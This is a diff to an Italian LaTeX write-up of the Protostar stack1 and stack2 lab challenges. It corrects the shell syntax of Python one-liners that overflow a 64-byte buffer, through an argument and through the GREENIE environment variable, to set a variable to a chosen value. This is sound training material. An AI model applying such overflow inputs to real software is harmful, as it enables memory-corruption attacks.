@@ -176,13 +176,13 @@ Leggiamo la documentazione sul set ASCII e capiamo che i caratteri corrispondent
 
 Dato che l'architettura intel è \textbf{Little Endian} l'input che inseriamo sarà al rovescio. Quindi il giusto input da inserire è:
 \begin{lstlisting}[style=bashstyle]
-    /opt/protostar/bin/stack1 'python -c 'print "a" * 64 + "dcba"'' 
+    /opt/protostar/bin$ ./stack1 $(python -c "print 'a'*64 + 'dcba'")
 \end{lstlisting}
 La variabile \textbf{modified} viene modificata correttamente, infatti ci viene stampato a video il messaggio: \textcolor{red}{you have correctly got the variable to the right value}. Vinciamo quindi la sfida.
 
 \subsection{Sintesi comandi da eseguire}
 \begin{lstlisting}[style=bashstyle]
-    /opt/protostar/bin/stack1 'python -c 'print "a" * 64 + "dcba"'' 
+    /opt/protostar/bin$ ./stack1 $(python -c "print 'a'*64 + 'dcba'")
 \end{lstlisting}
 
 % ------------------ 
@@ -246,7 +246,7 @@ L'idea su cui si poggia l'attacco a \texttt{stack2} è identica a quella vista p
 
 Possiamo farlo usando il comando:
 \begin{lstlisting}[style=bashstyle]
-    export GREENIE='python -c 'print "a" * 64'' + "\x0a\x0d\x0a\x0d"''
+    export GREENIE=$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'")
 \end{lstlisting}
 Mandiamo in esecuzione stack 2 e verrà stampato il messaggio: \textcolor{red}{you have correctly modified the variable}, vinciamo quindi la sfida.
 
@@ -255,7 +255,7 @@ Mandiamo in esecuzione stack 2 e verrà stampato il messaggio: \textcolor{red}{y
     # entriamo nella cartella di lavoro
     cd /opt/protostar/bin
     # modifichiamo GREENIE
-    export GREENIE='python -c 'print "a" * 64'' + "\x0a\x0d\x0a\x0d"''
+    export GREENIE=$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'")
 \end{lstlisting}
 
 % ------------------ 
